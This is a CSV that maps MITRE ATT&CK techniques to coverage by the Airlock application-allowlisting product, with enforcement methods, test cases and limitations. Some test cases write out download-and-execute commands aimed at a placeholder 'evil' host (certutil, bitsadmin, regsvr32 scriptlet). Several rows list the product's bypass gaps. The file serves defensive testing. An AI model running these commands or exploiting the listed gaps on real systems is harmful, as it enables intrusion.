technique_id,technique_name,tactics,covered,enforcement_mechanism,airlock_control,testable,test_case,limitations
T1078,Valid Accounts,"defense-evasion,initial-access,persistence,privilege-escalation",No,Valid accounts. Using legitimate credentials. Identity plane. No file execution.,none,no,N/A.,"Post-access, Airlock enforces on tools attacker runs with valid creds."
T1078.001,Default Accounts,"defense-evasion,initial-access,persistence,privilege-escalation",No,Default accounts. Identity.,none,no,N/A.,
T1078.002,Domain Accounts,"defense-evasion,initial-access,persistence,privilege-escalation",No,Domain accounts. Identity.,none,no,N/A.,
T1078.003,Local Accounts,"defense-evasion,initial-access,persistence,privilege-escalation",No,Local accounts. Identity.,none,no,N/A.,
T1080,Taint Shared Content,lateral-movement,Yes,"Taint shared content. Placing malicious files on network shares. When victim executes file, Airlock blocks untrusted payload.",default-deny + script-control,yes,Malicious exe on share -> victim double-clicks -> blocked.,File placement not prevented. Execution on victim blocked.
T1082,System Information Discovery,discovery,Yes,systeminfo.exe restrictable via blocklist metarule for non-admins.,blocklist-metarule,yes,Blocklist systeminfo.exe for non-admins.,WMI queries (via trusted wmic or PS) can retrieve same info if not blocklisted.
T1083,File and Directory Discovery,discovery,No,"File and directory discovery. dir, Get-ChildItem. Trusted.",none,no,N/A.,
T1087,Account Discovery,discovery,Yes,net.exe (net user) restrictable via blocklist metarule.,blocklist-metarule,yes,Blocklist net.exe for non-admins.,PowerShell alternatives if PS trusted.
T1087.001,Local Account,discovery,Yes,net user via net.exe. Restrictable.,blocklist-metarule,yes,Blocklist net.exe for non-admins.,
T1087.002,Domain Account,discovery,Yes,net user /domain via net.exe. Restrictable.,blocklist-metarule,yes,Blocklist net.exe for non-admins.,
T1087.003,Email Account,discovery,No,Email account discovery. Trusted tools/APIs.,none,no,N/A.,
T1090,Proxy,command-and-control,No,Proxy. Network infrastructure.,none,no,N/A.,
T1090.001,Internal Proxy,command-and-control,Yes,"Internal proxy tools (chisel, socat, netsh portproxy) — standalone tools blocked. netsh restrictable via blocklist metarule.",default-deny + blocklist-metarule,yes,1) chisel/socat -> blocked (untrusted). 2) Blocklist netsh for non-admins.,netsh portproxy is the built-in risk. Blocklist addresses it.
T1090.002,External Proxy,command-and-control,No,External proxy. Network.,none,no,N/A.,
T1090.003,Multi-hop Proxy,command-and-control,No,Multi-hop proxy. Network.,none,no,N/A.,
T1090.004,Domain Fronting,command-and-control,No,Domain fronting. Network.,none,no,N/A.,
T1091,Replication Through Removable Media,"initial-access,lateral-movement",Yes,Replication through removable media. Malware on USB must be trusted to execute. Autorun payloads blocked.,default-deny + script-control,yes,"Insert USB with unsigned exe, attempt to run -> blocked. Autorun pointing to untrusted payload -> blocked.",USB device insertion not prevented. Only execution of untrusted files.
T1092,Communication Through Removable Media,command-and-control,No,Communication through removable media. Data on USB for C2. No execution required.,none,no,N/A.,"If C2 agent on USB is untrusted, blocked."
T1095,Non-Application Layer Protocol,command-and-control,No,Non-application layer protocol. Network.,none,no,N/A.,
T1098,Account Manipulation,"persistence,privilege-escalation",No,Account manipulation. Identity-plane operation. No file execution.,none,no,N/A.,Identity/directory security.
T1098.002,Additional Email Delegate Permissions,"persistence,privilege-escalation",No,Additional email delegate permissions. No file execution.,none,no,N/A.,
T1098.005,Device Registration,"persistence,privilege-escalation",No,Device registration. MDM/identity plane.,none,no,N/A.,
T1098.007,Additional Local or Domain Groups,"persistence,privilege-escalation",Yes,net.exe used for group manipulation. Restrictable via blocklist metarule for non-admins.,blocklist-metarule,yes,Metarule: original_filename 'net' AND user NOT admin -> blocks net group/localgroup manipulation.,PowerShell AD cmdlets still available if PS is trusted for the user.
T1102,Web Service,command-and-control,No,Web service. Network.,none,no,N/A.,
T1102.001,Dead Drop Resolver,command-and-control,No,Dead drop resolver. Network.,none,no,N/A.,
T1102.002,Bidirectional Communication,command-and-control,No,Bidirectional communication. Network.,none,no,N/A.,
T1102.003,One-Way Communication,command-and-control,No,One-way communication. Network.,none,no,N/A.,
T1104,Multi-Stage Channels,command-and-control,No,Multi-stage channels. Network.,none,no,N/A.,"If staged payload is file, must be trusted."
T1105,Ingress Tool Transfer,command-and-control,Yes,"Ingress tool transfer — downloaded tools must be trusted to execute. Download succeeds but execution blocked. Download utilities (certutil, bitsadmin, curl) can be blocklisted.",default-deny + blocklist,yes,"1) certutil -urlcache -split -f http://evil/tool.exe C:\Temp\t.exe -> downloads, execution blocked. 2) Blocklist certutil/bitsadmin for non-admins.",Download not prevented. Execution is the control point.
T1106,Native API,execution,No,"Native API calls (NtCreateProcess, VirtualAllocEx, CreateRemoteThread) operate inside trusted processes. Airlock doesn't hook APIs. If API call loads new DLL/exe, that IS checked.",none,no,N/A - API-level behavior inside trusted processes.,By design. EDR territory.
T1110,Brute Force,credential-access,No,Brute force. Network-based credential attacks. No file execution on target.,none,no,N/A.,"If brute force tool is untrusted, tool blocked."
T1110.001,Password Guessing,credential-access,No,Password guessing. Network-level.,none,no,N/A.,
T1110.002,Password Cracking,credential-access,Yes,"Password cracking tools (hashcat, john) must be trusted. Blocked by default-deny.",default-deny,yes,"hashcat.exe, john.exe not allowlisted -> blocked.",Typically offline attack. Tools must be on the endpoint to be relevant.
T1110.003,Password Spraying,credential-access,No,Password spraying. Network-level.,none,no,N/A.,
T1110.004,Credential Stuffing,credential-access,No,Credential stuffing. Network-level.,none,no,N/A.,
T1111,Multi-Factor Authentication Interception,credential-access,No,MFA interception. Identity/protocol level.,none,no,N/A.,
T1112,Modify Registry,"defense-evasion,persistence",Yes,reg.exe and regedit.exe: restrict via blocklist metarule for non-admins. Many persistence techniques rely on registry modification — blocking reg.exe reduces attack surface.,blocklist-metarule,yes,Metarule: original_filename 'reg' AND user NOT admin -> blocks reg.exe. Metarule: original_filename 'regedit' AND user NOT admin -> blocks regedit.,PowerShell Set-ItemProperty still available if PS trusted. Registry APIs from trusted processes not caught.
T1113,Screen Capture,collection,No,Standalone screenshot tool blocked. Built-in Snipping Tool/PowerShell trusted.,default-deny (tool),partial,Untrusted tool -> blocked.,Built-in tools succeed.
T1114,Email Collection,collection,No,Email collection. Reading emails. Data operation.,none,no,N/A.,
T1114.001,Local Email Collection,collection,No,Local email collection. Data operation.,none,no,N/A.,
T1114.002,Remote Email Collection,collection,No,Remote email collection. Network/API operation.,none,no,N/A.,
T1114.003,Email Forwarding Rule,collection,No,Email forwarding rule. Config operation.,none,no,N/A.,
T1115,Clipboard Data,collection,No,Clipboard data. API-based access from trusted process.,none,no,N/A.,
T1119,Automated Collection,collection,No,Automated collection scripts must be trusted. But technique achievable with trusted PowerShell scripts.,default-deny (tool),partial,Untrusted collection script -> blocked.,Trusted PS scripts succeed.
T1120,Peripheral Device Discovery,discovery,No,Peripheral device discovery. Trusted tools/APIs.,none,no,N/A.,
T1123,Audio Capture,collection,No,Standalone audio capture tool blocked. Trusted tools/APIs succeed.,default-deny (tool),partial,Untrusted tool -> blocked.,
T1124,System Time Discovery,discovery,No,"System time discovery. w32tm, time. Trusted.",none,no,N/A.,
T1125,Video Capture,collection,No,Standalone video capture tool blocked. Trusted tools/APIs succeed.,default-deny (tool),partial,Untrusted tool -> blocked.,
T1127,Trusted Developer Utilities Proxy Execution,defense-evasion,Yes,Trusted developer utilities proxy execution (parent). Tools like MSBuild used to execute code. These LOLBINs can be blocklisted. Payloads they load must be trusted.,blocklist + default-deny + DLL-control,yes,"Blocklist MSBuild, InstallUtil, etc. Payload DLLs loaded by these tools must be trusted.",Core LOLBIN defense. Blocklist + DLL control is strong.
T1127.001,MSBuild,defense-evasion,Yes,MSBuild. Can compile and execute code from XML project files. MSBuild.exe can be blocklisted. Output binaries/DLLs must be trusted.,blocklist + DLL-control + default-deny,yes,1) Blocklist msbuild.exe for non-developers. 2) MSBuild output exe -> blocked (untrusted). 3) MSBuild loading untrusted DLL -> blocked.,"If MSBuild is allowlisted, it can compile code. Blocklist is key."
T1127.002,ClickOnce,defense-evasion,Yes,ClickOnce. Application deployment via .application files. Downloaded assemblies must be trusted.,default-deny + DLL-control,partial,ClickOnce deploying untrusted assembly -> blocked.,ClickOnce deployment mechanism itself uses trusted dfsvc.exe.
T1127.003,JamPlus,defense-evasion,Yes,JamPlus. Build tool. Can execute arbitrary code. Must be allowlisted to run.,default-deny,yes,JamPlus not allowlisted -> blocked.,Niche tool. Unlikely to be in enterprise allowlist.
T1129,Shared Modules,execution,Yes,Airlock allowlists DLLs by default. Every DLL load SHA-256 hashed and checked. Prevents DLL sideloading.,DLL-control,yes,1) Place unsigned DLL in trusted app directory (sideload) -> blocked. 2) LoadLibrary('C:\Temp\evil.dll') -> blocked.,"Reflective DLL injection (memory-only, never a file) not caught."
T1132,Data Encoding,command-and-control,No,Data encoding. Network-level.,none,no,N/A.,
T1132.001,Standard Encoding,command-and-control,No,Standard encoding. Network.,none,no,N/A.,
T1132.002,Non-Standard Encoding,command-and-control,No,Non-standard encoding. Network.,none,no,N/A.,
T1133,External Remote Services,"initial-access,persistence",No,"External remote services (VPN/RDP/Citrix). Access mechanism. Post-access, Airlock enforces on any tools attacker tries to run.",none (post-access execution controlled),partial,"RDP in, attempt unsigned tool -> blocked.",Access itself not prevented.
T1134,Access Token Manipulation,"defense-evasion,privilege-escalation",No,Access token manipulation. API-level operations inside trusted process. No file execution.,none,no,N/A.,"If tool for token manipulation is untrusted, tool itself blocked."
T1134.001,Token Impersonation/Theft,"defense-evasion,privilege-escalation",No,Token impersonation/theft. API-level.,none,no,N/A.,
T1134.002,Create Process with Token,"defense-evasion,privilege-escalation",No,"Process created with stolen token — the process binary must be trusted, but token manipulation itself is API-level and not caught.",default-deny,partial,N/A.,Token manipulation is identity/API level. EDR territory.
T1134.003,Make and Impersonate Token,"defense-evasion,privilege-escalation",No,Make and impersonate token. API-level.,none,no,N/A.,
T1134.004,Parent PID Spoofing,"defense-evasion,privilege-escalation",No,Parent PID spoofing is API-level process creation. Binary must be trusted but spoofing is not detected.,default-deny,partial,N/A.,May affect Airlock process trust rules that key on parent process. Test.
T1134.005,SID-History Injection,"defense-evasion,privilege-escalation",No,SID-History injection. Identity/AD manipulation.,none,no,N/A.,
T1135,Network Share Discovery,discovery,Yes,"net.exe (net share, net view) restrictable via blocklist metarule.",blocklist-metarule,yes,Blocklist net.exe for non-admins.,PowerShell Get-SmbShare available if PS trusted.
T1136,Create Account,persistence,Yes,net.exe (net user /add) restrictable via blocklist metarule for non-admins.,blocklist-metarule,yes,Blocklist net.exe for non-admins -> prevents net user /add.,PowerShell New-LocalUser/New-ADUser available if PS trusted.
T1136.001,Local Account,persistence,Yes,net.exe used for account creation. Restrictable via blocklist metarule.,blocklist-metarule,yes,Metarule: original_filename 'net' AND user NOT admin -> blocks net user /add.,PowerShell New-LocalUser available if PS trusted.
T1136.002,Domain Account,persistence,No,Domain account. Identity operation.,none,no,N/A.,
T1137,Office Application Startup,persistence,Yes,"Office application startup. Malicious add-ins (DLLs) must be trusted. Template macros: doc opens, payload blocked.",DLL-control + default-deny,yes,1) Untrusted Office add-in DLL -> blocked at Office startup. 2) Malicious .dotm macro drops exe -> exe blocked.,Macro code inside trusted Office not inspected.
T1137.001,Office Template Macros,persistence,Yes,Office template macros. Template loads in trusted Office. Macro code runs. Dropped payloads blocked.,default-deny + DLL-control,yes,Malicious .dotm macro drops exe -> exe blocked.,Macro code itself runs inside Office.
T1137.002,Office Test,persistence,Yes,Office Test reg key loads DLL into Office. DLL must be trusted.,DLL-control,yes,Set Office Test reg key to unsigned DLL -> DLL blocked at Office launch.,Reg mod not prevented.
T1137.003,Outlook Forms,persistence,Yes,Outlook forms loading DLLs — DLL must be trusted.,DLL-control + default-deny,partial,Outlook form loading untrusted DLL -> blocked.,VBScript running inside trusted Outlook form context may execute. Dropped payloads blocked.
T1137.004,Outlook Home Page,persistence,Yes,Outlook home page triggering external process execution — process must be trusted.,default-deny,partial,Outlook home page launching untrusted exe -> blocked.,HTML/script running inside Outlook's embedded browser context may not be caught.
T1137.005,Outlook Rules,persistence,Yes,Outlook rules can run applications. Application must be trusted.,default-deny,yes,Outlook rule to run C:\Temp\payload.exe -> blocked.,Rule creation not prevented.
T1137.006,Add-ins,persistence,Yes,Office add-ins (.dll/.xll). Must be trusted by hash/publisher.,DLL-control,yes,Untrusted .xll in add-in dir -> blocked by Excel.,Signed add-ins from trusted publishers load normally.
T1140,Deobfuscate/Decode Files or Information,defense-evasion,Yes,Decoded/deobfuscated payload must be trusted to execute. certutil.exe (commonly used for decoding) can be blocklisted.,default-deny + blocklist,yes,1) certutil -decode output.exe -> output.exe blocked. 2) Blocklist certutil for non-admins.,Decoding itself not prevented if tool is trusted. Decoded file execution IS blocked.
T1176,Software Extensions,persistence,Yes,Browser extensions. Dedicated browser extension control feature. Untrusted extensions blocked from installation on Chrome/Edge/Firefox. Extension updates monitored.,browser-extension-control,yes,1) Enable browser ext control in enforcement. 2) Install untrusted extension -> fails. 3) Untrusted extension update -> browser uninstalls it.,"Only controls extension installation, not JS within trusted extensions."
T1176.001,Browser Extensions,persistence,Yes,Browser extensions specifically. Same as parent.,browser-extension-control,yes,Same as T1176.,Same.
T1176.002,IDE Extensions,persistence,Yes,IDE must be allowlisted. IDE extension DLLs/native modules must be trusted.,default-deny + DLL-control,partial,Untrusted VS Code extension native module -> blocked at load.,JS-based extensions run inside trusted IDE process — not separately controlled.
T1185,Browser Session Hijacking,collection,No,"Browser session hijacking. In-browser or extension-based. Malicious extension install blocked by browser extension control, but technique achievable via trusted extensions or in-page JS.",browser-extension-control (partial),partial,Malicious extension -> install blocked.,In-browser techniques not caught.
T1187,Forced Authentication,credential-access,No,Forced authentication. Triggering NTLM auth via UNC paths. No file execution.,none,no,N/A.,
T1189,Drive-by Compromise,initial-access,Yes,Drive-by compromise — browser exploit in trusted browser. Any payload dropped to disk (exe/DLL/script) must be trusted.,default-deny + DLL-control,partial,Drive-by drops exe -> blocked. Drive-by drops DLL -> blocked.,In-browser exploitation executing entirely in memory not caught.
T1190,Exploit Public-Facing Application,initial-access,No,"Exploiting a public-facing application is a network/application security problem. Airlock doesn't prevent exploits. WAF, patching, network segmentation are the controls. Post-exploitation payload execution on the host is covered under execution techniques.",none,no,N/A.,"Web application firewalls, patching, and network segmentation are the primary controls."
T1195,Supply Chain Compromise,initial-access,No,"Supply chain compromise with valid publisher signatures. If compromised software is signed by a publisher trusted in Airlock policy, it passes. Unsigned/differently-signed supply chain payloads blocked.",default-deny,partial,Unsigned supply chain payload -> blocked. Signed by compromised-but-trusted publisher -> allowed.,Publisher trust is the gap. Hash-based trust is more granular. This is a fundamental supply chain risk for any trust model.
T1195.001,Compromise Software Dependencies and Development Tools,initial-access,No,Same principle as parent. Compromised dependency signed by trusted publisher passes.,DLL-control + default-deny,partial,Untrusted dependency DLL -> blocked.,Signed by trusted publisher -> passes.
T1195.002,Compromise Software Supply Chain,initial-access,No,Same. Compromised software update with valid signature passes publisher trust.,default-deny,partial,Unsigned update -> blocked.,
T1195.003,Compromise Hardware Supply Chain,initial-access,No,Compromise hardware supply chain. Physical hardware. Below software layer.,none,no,N/A.,Hardware security.
T1197,BITS Jobs,"defense-evasion,persistence",Yes,BITS downloads files to disk. Downloaded file must be trusted to execute. bitsadmin.exe can be blocklisted to prevent BITS job creation.,default-deny + blocklist,yes,"bitsadmin /transfer job /download http://evil/payload.exe C:\Temp\p.exe -> downloads OK, execution blocked. Blocklist bitsadmin for non-admins.",Download itself not prevented — only execution of downloaded payload.
T1199,Trusted Relationship,initial-access,No,"Trusted relationship. Third-party access. Access mechanism, not file execution. Post-access Airlock enforces.",none,partial,"Third party RDPs in, runs unsigned tool -> blocked.",Access not prevented.
T1200,Hardware Additions,initial-access,No,"Hardware additions. Physical device. If device delivers malware, execution blocked. Device insertion not prevented.",default-deny (for payloads),partial,Rogue USB device drops malware -> malware blocked.,Physical access/device insertion not Airlock scope.
T1201,Password Policy Discovery,discovery,Yes,net accounts via net.exe. Restrictable via blocklist metarule.,blocklist-metarule,yes,Blocklist net.exe for non-admins.,
T1202,Indirect Command Execution,defense-evasion,Yes,"Indirect command execution via trusted LOLBINs (pcalua.exe, forfiles.exe, etc). Launched payload must be trusted. The indirect launchers can be blocklisted.",default-deny + blocklist,yes,"1) forfiles /c C:\Temp\malware.exe -> malware blocked. 2) Blocklist pcalua.exe, forfiles.exe, SyncAppvPublishingServer.exe.",Indirect launcher is trusted but payload is still checked at execution.
T1203,Exploitation for Client Execution,execution,Yes,Client-side exploits execute inside trusted processes. Airlock doesn't prevent the exploit itself. But post-exploitation: any payload dropped to disk (exe/DLL/script) must be trusted. Attacker's dropped tools blocked.,default-deny + DLL-control,partial,Trusted app exploited -> exploit drops C:\Temp\payload.exe -> payload blocked. Exploit drops DLL for sideload -> DLL blocked.,"Pure in-memory exploitation (ROP chains, shellcode executing entirely in-process) not caught. That's EDR + exploit protection territory."
T1204,User Execution,execution,Yes,"Core Airlock value. User double-clicks malicious file -> blocked by default-deny. Covers exe, script, installer, DLL.",default-deny + script-control + DLL-control,yes,"Copy unsigned exe/msi/script to desktop, double-click -> blocked.",Social engineering itself not prevented.
T1204.001,Malicious Link,execution,Yes,Malicious link leads to file download. Downloaded payload must be trusted to execute. Airlock blocks the execution regardless of how the file was obtained.,default-deny,yes,Click link -> download unsigned exe -> attempt to run -> blocked.,Link clicking itself not prevented. Browser-only attacks (credential phishing pages) not in scope — that's web filtering/proxy.
T1204.002,Malicious File,execution,Yes,"Direct hit. Malicious file opened by user -> blocked. Covers email attachments, USB, downloads. MSI via script control. Macro-enabled docs: doc opens, dropped payload blocked.",default-deny + script-control + DLL-control,yes,1) Unsigned exe from email -> blocked. 2) Malicious .msi -> blocked. 3) Macro doc drops exe -> exe blocked.,Doc opens in trusted Office. Macro code runs inside Office.
T1204.004,Malicious Copy and Paste,execution,Yes,Pasted commands run inside trusted interpreter (not inspected). But any untrusted payload the pasted command tries to execute IS blocked. Blocklisting interpreters for non-admins prevents the paste target entirely.,default-deny + blocklist,yes,"1) Paste download cradle into PS -> download succeeds, dropped exe blocked. 2) Blocklist PS for non-admins -> user can't open interpreter to paste into.",Inline commands in trusted interpreter not inspected. Blocking the interpreter is the strongest control.
T1204.005,Malicious Library,execution,Yes,DLL/library control blocks untrusted native libraries at load time. npm/pip packages with malicious native extensions blocked.,DLL-control,yes,npm install with malicious native addon (.dll) -> blocked.,Pure interpreted library code needs script control.
T1205,Traffic Signaling,"command-and-control,defense-evasion,persistence",No,Traffic signaling / port knocking. Network-level. No file execution.,none,no,N/A.,Network security.
T1205.001,Port Knocking,"command-and-control,defense-evasion,persistence",No,Port knocking. Network-level.,none,no,N/A.,
T1205.002,Socket Filters,"command-and-control,defense-evasion,persistence",No,Socket filters. Kernel-level network manipulation.,none,no,N/A.,
T1207,Rogue Domain Controller,defense-evasion,No,Rogue domain controller. AD-level attack. Not file execution.,none,no,N/A.,AD security.
T1210,Exploitation of Remote Services,lateral-movement,Yes,Exploitation of remote services. Exploit on remote target. Post-exploitation tools must be trusted on target.,default-deny (on target),partial,Exploit drops tool on target -> blocked.,In-memory exploitation not caught.
T1211,Exploitation for Defense Evasion,defense-evasion,Yes,"Exploit runs inside trusted process. If it drops tools/payloads to disk, those must be trusted.",default-deny,partial,Exploit dropping tool to disk -> tool blocked.,In-memory exploitation not caught. EDR + exploit protection territory.
T1212,Exploitation for Credential Access,credential-access,Yes,"Exploitation for credential access. Exploit runs inside trusted process. If drops tools, blocked.",default-deny,partial,Dropped credential tool -> blocked.,In-memory exploitation not caught.
T1213,Data from Information Repositories,collection,No,Data from information repositories. Reading data from wikis/SharePoint. Data/network operation.,none,no,N/A.,
T1213.002,Sharepoint,collection,No,SharePoint. Network/API access.,none,no,N/A.,
T1213.006,Databases,collection,No,Databases. Network/API access.,none,no,N/A.,
T1216,System Script Proxy Execution,defense-evasion,Yes,System script proxy execution (parent). Signed scripts used to execute code. Scripts can be blocklisted.,blocklist + script-control,yes,Blocklist known proxy scripts. Payload loaded by proxy must be trusted.,
T1216.001,PubPrn,defense-evasion,Yes,PubPrn.vbs. Signed VBScript for proxy execution. Can be blocklisted or covered by script control.,blocklist + script-control,yes,Blocklist PubPrn.vbs or block via script control if modified (hash change).,Original signed PubPrn.vbs may be trusted by publisher.
T1216.002,SyncAppvPublishingServer,defense-evasion,Yes,SyncAppvPublishingServer. Can execute PowerShell. The PS code must pass script control.,script-control + blocklist,yes,Blocklist SyncAppvPublishingServer.exe. PS script it invokes checked by script control.,
T1217,Browser Information Discovery,discovery,No,Browser information discovery. Reading browser data. Data operation.,none,no,N/A.,
T1218,System Binary Proxy Execution,defense-evasion,Yes,System binary proxy execution (parent). LOLBINs used to execute code bypassing application controls. Airlock has predefined blocklist packages for these. DLL/script payloads must be trusted. This is a key defense area for Airlock.,blocklist (predefined) + DLL-control + script-control,yes,Import LOLBAS/Microsoft Recommended Block Rules predefined blocklist. Payloads loaded by LOLBINs must be trusted regardless.,Comprehensive LOLBIN defense with blocklist + payload control.
T1218.001,Compiled HTML File,defense-evasion,Yes,Compiled HTML (.chm). hh.exe opens CHM files. Content inside CHM can launch processes. Launched process must be trusted. hh.exe can be blocklisted.,default-deny + blocklist,yes,1) CHM launching untrusted exe -> blocked. 2) Blocklist hh.exe.,CHM HTML content inside hh.exe context may execute some scripts.
T1218.002,Control Panel,defense-evasion,Yes,Control panel items (.cpl). CPL files are DLLs. Must be trusted.,DLL-control,yes,Malicious .cpl (DLL) -> blocked at load.,
T1218.003,CMSTP,defense-evasion,Yes,CMSTP. Can install/execute COM scriptlets. cmstp.exe can be blocklisted. Loaded DLLs must be trusted.,blocklist + DLL-control,yes,1) Blocklist cmstp.exe. 2) CMSTP loading untrusted DLL -> blocked.,
T1218.004,InstallUtil,defense-evasion,Yes,InstallUtil. .NET utility executing assemblies. Can be blocklisted. Loaded assemblies (DLLs) must be trusted.,blocklist + DLL-control,yes,1) Blocklist installutil.exe. 2) InstallUtil loading untrusted assembly -> blocked.,
T1218.005,Mshta,defense-evasion,Yes,Mshta. HTML application host. Can execute VBScript/JScript. Covered by script control. Can be blocklisted. Predefined in blocklist packages.,blocklist + script-control,yes,1) Blocklist mshta.exe. 2) HTA file -> script control blocks untrusted content.,Key LOLBIN. Blocklist strongly recommended.
T1218.007,Msiexec,defense-evasion,Yes,Msiexec. MSI execution. MSI files covered by script control. Msiexec can be restricted. DLLs loaded by MSI must be trusted.,script-control + blocklist + DLL-control,yes,1) Untrusted MSI -> blocked by script control. 2) MSI loading untrusted DLL -> blocked.,Trusted-signed MSIs from trusted publishers install.
T1218.008,Odbcconf,defense-evasion,Yes,Odbcconf. Can execute DLLs. Can be blocklisted. DLL must be trusted.,blocklist + DLL-control,yes,1) Blocklist odbcconf.exe. 2) Odbcconf loading untrusted DLL -> blocked.,
T1218.009,Regsvcs/Regasm,defense-evasion,Yes,Regsvcs/Regasm. .NET registration utilities. Execute assemblies. Can be blocklisted. Assemblies must be trusted.,blocklist + DLL-control,yes,1) Blocklist regsvcs/regasm. 2) Loaded assembly must be trusted.,
T1218.010,Regsvr32,defense-evasion,Yes,Regsvr32. COM object registration. Loads DLLs. Can be blocklisted. DLLs must be trusted. Network-based scriptlet execution also blocked if regsvr32 blocklisted.,blocklist + DLL-control,yes,1) Blocklist regsvr32.exe. 2) Regsvr32 loading untrusted DLL -> blocked. 3) regsvr32 /s /n /u /i:http://evil scrobj.dll -> blocked if regsvr32 blocklisted.,Key LOLBIN.
T1218.011,Rundll32,defense-evasion,Yes,Rundll32. Executes DLL exports. DLL must be trusted. Rundll32 can be blocklisted for non-admins.,DLL-control + blocklist,yes,"1) rundll32 untrusted.dll,EntryPoint -> DLL blocked. 2) Blocklist rundll32 for non-admins.",Rundll32 with trusted DLLs runs normally.
T1218.012,Verclsid,defense-evasion,Yes,Verclsid. COM CLSID verification. Loads DLLs. DLL must be trusted.,DLL-control,yes,Verclsid loading untrusted DLL -> blocked.,Niche LOLBIN.
T1218.013,Mavinject,defense-evasion,Yes,Mavinject. DLL injection utility. Can be blocklisted. DLL must be trusted.,blocklist + DLL-control,yes,1) Blocklist mavinject.exe. 2) Mavinject loading untrusted DLL -> blocked.,
T1218.014,MMC,defense-evasion,Yes,MMC. Snap-in execution via .msc files. Snap-in DLLs must be trusted.,DLL-control,yes,MMC loading untrusted snap-in DLL -> blocked.,MMC itself is trusted. Snap-in DLLs are the control point.
T1218.015,Electron Applications,defense-evasion,Yes,"Untrusted Electron app exe blocked by default-deny. If Electron app is trusted, its bundled JS runtime executes in-process.",default-deny,yes,Untrusted Electron app exe -> blocked.,Trusted Electron apps run their bundled code in-process — not separately controlled.
T1219,Remote Access Tools,command-and-control,Yes,"Remote access tools (Cobalt Strike, AnyDesk, TeamViewer, etc) must be allowlisted. Unauthorized RATs blocked.",default-deny,yes,1) Cobalt Strike beacon -> blocked. 2) AnyDesk not allowlisted -> blocked.,RATs signed by trusted publisher may pass publisher trust. Blocklist specific unwanted RATs.
T1219.001,IDE Tunneling,command-and-control,Yes,IDE tunneling. IDE tools (VS Code Remote) must be allowlisted.,default-deny,yes,VS Code Remote tunnel binary not allowlisted -> blocked.,"If IDE legitimately trusted, tunnel works."
T1219.002,Remote Desktop Software,command-and-control,Yes,Remote desktop software. RMM tools must be allowlisted.,default-deny,yes,Unauthorized RMM tool exe -> blocked.,Legitimately deployed RMM tools are trusted.
T1219.003,Remote Access Hardware,command-and-control,No,Remote access hardware. Physical devices. Not software.,none,no,N/A.,
T1220,XSL Script Processing,defense-evasion,Yes,XSL script processing. msxsl.exe can be blocklisted. wmic with /format:xsl — payload scripts checked by script control.,blocklist + script-control,yes,1) Blocklist msxsl.exe. 2) XSL script payload checked via script control.,wmic.exe with /format:xsl harder to control without blocklisting wmic itself.
T1221,Template Injection,defense-evasion,Yes,Template injection in Office docs. Remote template loads in trusted Office. Macro code runs inside Office. Dropped payloads blocked.,default-deny + DLL-control,partial,Remote template macro drops exe -> exe blocked.,Macro code runs inside trusted Office process.
T1222,File and Directory Permissions Modification,defense-evasion,Yes,"Permission modification tools (icacls, takeown) restrictable via blocklist metarule.",blocklist-metarule,yes,Blocklist icacls.exe and takeown.exe for non-admins.,PowerShell alternatives still available if PS trusted.
T1222.001,Windows File and Directory Permissions Modification,defense-evasion,Yes,icacls.exe and takeown.exe: restrict via blocklist metarule for non-admins.,blocklist-metarule,yes,Blocklist icacls.exe and takeown.exe for non-admins.,PowerShell Set-Acl available if PS trusted.
T1480,Execution Guardrails,defense-evasion,No,"Execution guardrails. If malware is untrusted, blocked before guardrails checked.",default-deny (indirect),yes,N/A.,Malware can't execute to check guardrails.
T1480.001,Environmental Keying,defense-evasion,No,Environmental keying. Same as parent.,default-deny (indirect),yes,Same as T1480.,
T1480.002,Mutual Exclusion,defense-evasion,No,Mutual exclusion. Same as parent.,default-deny (indirect),yes,Same as T1480.,
T1482,Domain Trust Discovery,discovery,Yes,nltest.exe and dsquery.exe: restrict via blocklist metarule for non-admins.,blocklist-metarule,yes,Blocklist nltest.exe and dsquery.exe for non-admins.,PowerShell Get-ADTrust available if PS trusted.
T1484,Domain or Tenant Policy Modification,"defense-evasion,privilege-escalation",No,Domain/tenant policy modification. AD/cloud policy changes. No file execution.,none,no,N/A.,AD security.
T1484.001,Group Policy Modification,"defense-evasion,privilege-escalation",No,Group policy modification. AD operation.,none,no,N/A.,"If modified GPO delivers untrusted software, execution blocked on endpoints."
T1484.002,Trust Modification,"defense-evasion,privilege-escalation",No,Trust modification. AD trust changes.,none,no,N/A.,
